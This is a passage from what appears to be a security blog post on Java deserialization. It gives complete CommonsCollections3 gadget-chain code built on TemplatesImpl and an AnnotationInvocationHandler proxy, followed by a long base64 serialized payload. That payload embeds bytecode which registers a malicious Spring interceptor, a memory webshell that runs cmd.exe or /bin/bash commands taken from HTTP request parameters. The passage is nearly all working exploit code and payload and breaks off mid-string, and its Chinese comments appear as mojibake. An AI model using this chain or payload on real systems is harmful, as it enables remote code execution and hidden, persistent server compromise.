class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>cc3é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Interceptor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;InterceptorDes.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)).writeObject(obj);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAjZsr+ur4AAAA0ALsKACoAZwoAaABpCABqCwBrAGwHAG0HAG4LAAUAbwgAcAoAFwBxBwByCgAKAHMKAHQAdQoAdAB2BwB3BwB4CgAPAHMIAHkHAHoKABIAZwoAEgB7BwB8CAB9BwB+BwB/BwBPCQCAAIEKABcAggoAgwB1CgCEAIUKAIQAhgcAhwgAiAoAgACJCgCDAIoKABcAiwoAjACNBwCOCwAOAI8HAJAKACcAcwcAkQcAkgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAaTGNvbS9jbG93bi9JbnRlcmNlcHRvckRlczsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkwEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEABGNvZGUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAPZXZpbEludGVyY2VwdG9yAQA0TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBACJMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47AQANU3RhY2tNYXBUYWJsZQcAbQcAbgcAlAcAcgcAdwcAeAcAkAEAClNvdXJjZUZpbGUBABNJbnRlcmNlcHRvckRlcy5qYXZhDAArACwHAJUMAJYAlwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAmAwAmQCaAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAD5vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZwwAmwCcAQATYWRhcHRlZEludGVyY2VwdG9ycwwAnQCeAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDACfACwHAJQMAKAAoQwAogCjAQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgER0Hl2NjZ2Z0FBQURRQXJBb0FLQUJlQ0FCRkN3QmZBR0FMQUdFQVlnZ0FZd29BWkFCbENnQUxBR1lJQUdjS0FBc0FhQWNBYVFjQWFnZ0Fhd2dBYkFvQUNnQnRDQUJ1Q0FCdkNnQUtBSEFLQUFvQWNRY0FjZ2NBY3dvQWRBQjFDZ0FVQUhZS0FCTUFkd2dBZUFjQWVRb0FHUUJlQ2dBVEFIb0tBQmtBZXdnQWZBb0FHUUI5Q1FCa0FINEtBSDhBZ0FvQWdRQ0FDZ0NCQUlJS0FJRUFnd2NBaEFzQUtRQ0ZDd0FwQUlZSEFJY0hBSWdIQUlrQkFBWThhVzVwZEQ0QkFBTW9LVllCQUFSRGIyUmxBUUFQVEdsdVpVNTFiV0psY2xSaFlteGxBUUFTVEc5allXeFdZWEpwWVdKc1pWUmhZbXhsQVFBRWRHaHBjd0VBUFV4dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjanNCQUFsd2NtVklZVzVrYkdVQkFHUW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGNYVmxjM1E3VEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE8weHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bGFBUUFCY0FFQUdreHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemMwSjFhV3hrWlhJN0FRQUdkM0pwZEdWeUFRQVZUR3BoZG1FdmFXOHZVSEpwYm5SWGNtbDBaWEk3QVFBSGNISnZZMlZ6Y3dFQUUweHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQUZ5QVFBWVRHcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWEk3QVFBR2NtVnpkV3gwQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUhjbVZ6ZFd4MGN3RUFHVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFFa3hxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQkdOdlpHVUJBQTFUZEdGamEwMWhjRlJoWW14bEJ3QnFCd0NLQndCcEJ3Q0hCd0NMQndDTUJ3Q0lCd0NOQndCeUJ3QjVCd0NFQVFBS1JYaGpaWEIwYVc5dWN3RUFFRTFsZEdodlpGQmhjbUZ0WlhSbGNuTUJBQXB3YjNOMFNHRnVaR3hsQVFDU0tFeHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBPMHhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYTndiMjV6WlR0TWFtRjJZUzlzWVc1bkwwOWlhbVZqZER0TWIzSm5MM053Y21sdVoyWnlZVzFsZDI5eWF5OTNaV0l2YzJWeWRteGxkQzlOYjJSbGJFRnVaRlpwWlhjN0tWWUJBQXh0YjJSbGJFRnVaRlpwWlhjQkFDNU1iM0puTDNOd2NtbHVaMlp5WVcxbGQyOXlheTkzWldJdmMyVnlkbXhsZEM5TmIyUmxiRUZ1WkZacFpYYzdBUUFQWVdaMFpYSkRiMjF3YkdWMGFXOXVBUUI1S0V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWEYxWlhOME8weHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhOd2IyNXpaVHRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzcFZnRUFBbVY0QVFBVlRHcGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNDdBUUFLVTI5MWNtTmxSbWxzWlFFQUZGUmxjM1JKYm5SbGNtTmxjSFJ2Y2k1cVlYWmhEQUFxQUNzSEFJc01BSTRBandjQWpBd0FrQUNSQVFBSGIzTXVibUZ0WlFjQWtnd0Frd0NQREFDVUFKVUJBQU4zYVc0TUFKWUFsd0VBR0dwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56UW5WcGJHUmxjZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFkamJXUXVaWGhsQVFBQ0wyTU1BQ29BbUFFQUNTOWlhVzR2WW1GemFBRUFBaTFqREFDWkFKb01BSnNBbkFFQUZtcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWElCQUJscVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdFVtVmhaR1Z5QndDTkRBQ2RBSjRNQUNvQW53d0FLZ0NnQVFBQUFRQVhhbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJTUFLRUFsUXdBb2dDakFRQUNEUW9NQUtRQWxRd0FwUUNtQndDbkRBQ29BS2tIQUlvTUFLb0FLd3dBcXdBckFRQVRhbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZiZ3dBVkFCVkRBQllBRmtCQUR0dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjZ0VBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQURKdmNtY3ZjM0J5YVc1blpuSmhiV1YzYjNKckwzZGxZaTl6WlhKMmJHVjBMMGhoYm1Sc1pYSkpiblJsY21ObGNIUnZjZ0VBRTJwaGRtRXZhVzh2VUhKcGJuUlhjbWwwWlhJQkFDVnFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBBUUFtYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFER2RsZEZCaGNtRnRaWFJsY2dFQUppaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFKWjJWMFYzSnBkR1Z5QVFBWEtDbE1hbUYyWVM5cGJ5OVFjbWx1ZEZkeWFYUmxjanNCQUJCcVlYWmhMMnhoYm1jdlUzbHpkR1Z0QVFBTFoyVjBVSEp2Y0dWeWRIa0JBQXQwYjB4dmQyVnlRMkZ6WlFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFJWTI5dWRHRnBibk1CQUJzb1RHcGhkbUV2YkdGdVp5OURhR0Z5VTJWeGRXVnVZMlU3S1ZvQkFCWW9XMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBVGNtVmthWEpsWTNSRmNuSnZjbE4wY21WaGJRRUFIU2hhS1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6YzBKMWFXeGtaWEk3QVFBRmMzUmhjblFCQUJVb0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQTVuWlhSSmJuQjFkRk4wY21WaGJRRUFGeWdwVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0FRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0FRQVRLRXhxWVhaaEwybHZMMUpsWVdSbGNqc3BWZ0VBQ0hKbFlXUk1hVzVsQVFBR1lYQndaVzVrQVFBdEtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJN0FRQUlkRzlUZEhKcGJtY0JBQU52ZFhRQkFCVk1hbUYyWVM5cGJ5OVFjbWx1ZEZOMGNtVmhiVHNCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVmdFQUJXWnNkWE5vQVFBRlkyeHZjMlVBSVFBbkFDZ0FBUUFwQUFBQUJBQUJBQ29BS3dBQkFDd0FBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBTFFBQUFBWUFBUUFBQUF3QUxnQUFBQXdBQVFBQUFBVUFMd0F3QUFBQUFRQXhBRElBQXdBc0FBQUNKd0FHQUFzQUFBRGNLeElDdVFBREFnQTZCQmtFeGdET0xMa0FCQUVBT2dVU0JiZ0FCcllBQnhJSXRnQUptUUFpdXdBS1dRYTlBQXRaQXhJTVUxa0VFZzFUV1FVWkJGTzNBQTQ2QnFjQUg3c0FDbGtHdlFBTFdRTVNEMU5aQkJJUVUxa0ZHUVJUdHdBT09nWVpCZ1MyQUJGWEdRYTJBQkk2QjdzQUUxbTdBQlJaR1FlMkFCVzNBQmEzQUJjNkNCSVlPZ203QUJsWnR3QWFPZ29aQ0xZQUcxazZDY1lBSUJrS3V3QVpXYmNBR2hrSnRnQWNFaDIyQUJ5MkFCNjJBQnhYcC8vYnNnQWZHUXEyQUNBWkJSa0t0Z0FoR1FXMkFDSVpCYllBSTZjQUJUb0ZBNndFckFBQkFBOEEwd0RXQUNRQUF3QXRBQUFBVmdBVkFBQUFEd0FLQUJBQUR3QVNBQmNBRkFBbkFCVUFSZ0FYQUdJQUdRQnBBQm9BY0FBYkFJVUFIQUNKQUIwQWtnQWVBSjBBSHdDNkFDRUF3Z0FpQU1rQUl3RE9BQ1FBMHdBbUFOWUFKUURZQUNjQTJnQXBBQzRBQUFCNkFBd0FRd0FEQURNQU5BQUdBQmNBdkFBMUFEWUFCUUJpQUhFQU13QTBBQVlBY0FCakFEY0FPQUFIQUlVQVRnQTVBRG9BQ0FDSkFFb0FPd0E4QUFrQWtnQkJBRDBBUGdBS0FBQUEzQUF2QURBQUFBQUFBTndBUHdCQUFBRUFBQURjQUVFQVFnQUNBQUFBM0FCREFFUUFBd0FLQU5JQVJRQThBQVFBUmdBQUFGVUFCLzBBUmdjQVJ3Y0FTUHdBR3djQVNmOEFMd0FMQndCS0J3QkxCd0JNQndCTkJ3QkhCd0JJQndCSkJ3Qk9Cd0JQQndCSEJ3QlFBQUFuL3dBYkFBVUhBRW9IQUVzSEFFd0hBRTBIQUVjQUFRY0FVUUVCQUZJQUFBQUVBQUVBSkFCVEFBQUFEUU1BUHdBQUFFRUFBQUJEQUFBQUFRQlVBRlVBQXdBc0FBQUFZQUFGQUFVQUFBQUtLaXNzTFJrRXR3QWxzUUFBQUFJQUxRQUFBQW9BQWdBQUFDNEFDUUF2QUM0QUFBQTBBQVVBQUFBS0FDOEFNQUFBQUFBQUNnQS9BRUFBQVFBQUFBb0FRUUJDQUFJQUFBQUtBRU1BUkFBREFBQUFDZ0JXQUZjQUJBQlNBQUFBQkFBQkFDUUFVd0FBQUJFRUFEOEFBQUJCQUFBQVF3QUFBRllBQUFBQkFGZ0FXUUFEQUN3QUFBQmdBQVVBQlFBQUFBb3FLeXd0R1FTM0FDYXhBQUFBQWdBdEFBQUFDZ0FDQUFBQU13QUpBRFFBTGdBQUFEUUFCUUFBQUFvQUx3QXdBQUFBQUFBS0FEOEFRQUFCQUFBQUNnQkJBRUlBQWdBQUFBb0FRd0JFQUFNQUFBQUtBRm9BV3dBRUFGSUFBQUFFQUFFQUpBQlRBQUFBRVFRQVB3QUFBRUVBQUFCREFBQUFXZ0FBQUFFQVhBQUFBQUlBWFE9PQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAKQApQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwcApgwApwBTDACoAKkHAKoHAKsMAKwArQwArgCvAQAQamF2YS9sYW5nL09iamVjdAEAO29yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuaW50ZXJjZXB0b3IuVGVzdEludGVyY2VwdG9yDACwALEMALIAswwAtAC1BwC2DAC3ALgBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgwAuQC6AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAGGNvbS9jbG93bi9JbnRlcmNlcHRvckRlcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW